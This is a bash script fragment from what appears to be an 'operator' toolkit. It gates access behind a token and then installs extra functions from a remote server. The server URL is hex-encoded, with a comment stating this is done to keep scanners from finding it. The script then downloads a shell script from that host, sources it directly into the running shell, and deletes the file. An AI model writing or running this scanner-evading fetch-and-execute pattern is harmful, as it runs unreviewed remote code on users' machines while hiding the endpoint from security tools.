NG_OPTOKEN='nope' 

OPERATOR_VERIFICATION(){
  print_status "SECURITY" "Validating Operator Token"
    
  # OPTOKEN Validation
  # Only encoded to stop scanners from finding the url.
  enc_url=$(printf "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x63\x75\x72\x65\x2e\x6e\x65\x6d\x65\x73\x69\x73\x67\x72\x6f\x75\x70\x2e\x6e\x65\x74\x2f\x73\x2f")
  KISS_URL="$enc_url$NG_OPTOKEN"
  
  if curl -s --head --request GET "$KISS_URL" | grep "HTTP/2 404" > /dev/null; then
    print_status "ERROR" "Invalid operator token detected"
    print_status "WARNING" "The token '$NG_OPTOKEN' is not valid"
    print_status "INFO" "Please update the NG_OPTOKEN variable with a valid token"
    echo ""
    print_status "INFO" "Press Enter to return to muggle menu..."
    read -r < /dev/tty
    MENU
  else
    print_status "SUCCESS" "Valid operator token confirmed"
    print_status "INFO" "${RED}press Enter${NC} to access operator menu"
    read -r < /dev/tty
    clear
    print_section_header " OPERATOR TOOLSET INSTALLATION"

    # Download Function script for server
    print_status "PROGRESS" "Fetching dynamic functions from server"

    # Download the functions script from server
    if curl -fsSL $KISS_URL/download -o ./ng_functions.sh; then
      source ./ng_functions.sh

      # Clean up temp file
      rm -f ./ng_functions.sh

      print_status "INFO" "Functions are now available in the operator menu"
      print_status "INFO" "Press Enter to return to updated operator menu..."
      read -r < /dev/tty

      # Return to updated menu
      KISS_NG_MENU
    else
      MENU
    fi
  fi
}
MENU
